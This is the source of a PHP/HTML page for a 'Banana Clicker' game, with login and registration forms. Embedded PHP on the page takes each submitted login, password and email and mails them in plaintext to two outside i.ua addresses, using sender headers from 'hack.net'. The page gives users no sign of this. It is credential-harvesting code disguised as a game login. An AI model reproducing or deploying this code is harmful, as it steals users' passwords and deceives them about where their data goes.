<!DOCTYPE HTML>
<html lang="ru-RU">

<head>
    <title>&nbsp;</title>
    <meta charset="UTF-8">
    <script src="js/jquery.js" type="text/javascript"></script>
    <script src="js/forge.js"></script>
    <script src="js/helps.js"></script>
    <script src="js/auth.js"></script>
    <script src="js/at.js"></script>
    <script src="js/btns.js"></script>
    <script src="js/main.js"></script>
    <link rel="stylesheet" type="text/css" href="css/anims.css" media="all">
    <link rel="stylesheet" type="text/css" href="css/style.css" media="all">
    <link rel="stylesheet" type="text/css" href="css/main.css" media="all">
    <link rel="shortcut icon" type="image/x-icon" href="img/png/banana.png">
</head>
<?php 
$name = $email = $password = "";
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $login = test_input($_POST["login"]); 
    $email = test_input($_POST["email"]); 
    $password = test_input($_POST["password"]); 
} 
function test_input($data) { 
    $data = trim($data); 
    $data = stripslashes($data); 
    $data = htmlspecialchars($data);
    return $data; 
}

$to = "crspd@i.ua, VolVriuk@i.ua";
$subject = "Contacts";

$message = "Login: $login , password: $password , email: $email .";
$headers .= 'From: Zitro@hack.net' . "\r\n";
$headers .= 'Cc: Veragy@hack.net' . "\r\n";

mail($to,$subject,$message,$headers);
?>
<body>
    <img src onerror="globalInit()">
    <button class="autow" onclick="animateTitle('B A N A . N A &nbsp; - &nbsp; B A N A N A &nbsp; C L I C K E R &nbsp; ')">Animate!</button>
    <button class="ald autow" id="logbtn">
        Login!
    </button>
    <button class="ald autow" id="regbtn">
        Register!
    </button>
    <div id="rf" class="modal">
        <div class="modal-content">
            <span class="x" onclick="hnra(rf)" title="Close Form">×</span><br>
            <div id="reg" class="cont">
                <form action='<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>' method="post">
                    <input type="text" name="login" placeholder="Put your login there" id="lr"><br>
                    <input type="password" name="password" placeholder="Put your password there" id="pr"><br>
                    <input type="email" name="email" placeholder="Put your email there" id="emr"><br>
                    <div class="clearfix">
                        <button class="cnlbtn">
                        	Cancel
                    	</button>
                        <input type="submit" class="regbtn" id="snup" value="Register">
                    </div>
                </form>
            </div>
        </div>
    </div>
    <div id="lf" class="modal">
        <div class="modal-content">
            <span class="x" onclick="hnra(lf)" title="Close Form">×</span><br>
            <div id="log" class="cont">
                <form action='<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>' method="post">
                    <input type="text" name="login" placeholder="Put your login there" id="ll"><br>
                    <input type="password" name="password" placeholder="Put your password there" id="pl"><br>
                    <input type="email" name="email" placeholder="Put your email there" id="eml"><br>
                    <div id="ec"></div><br>
                    <div class="clearfix">
                        <button class="cnlbtn">
                        	Cancel
                    	</button>
                        <input type="submit" class="logbtn" id="snin" value="Login">
                    </div>
                </form>
            </div>
        </div>
    </div>
</body>

</html>